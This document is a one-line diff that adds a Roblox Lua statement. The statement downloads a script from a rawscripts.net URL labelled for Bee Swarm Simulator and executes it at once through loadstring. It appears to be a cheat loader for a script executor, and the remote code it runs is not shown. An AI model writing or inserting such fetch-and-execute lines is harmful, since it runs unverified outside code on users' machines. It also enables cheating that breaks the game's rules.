@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Bee-Swarm-Simulator-BSS-136510"))()
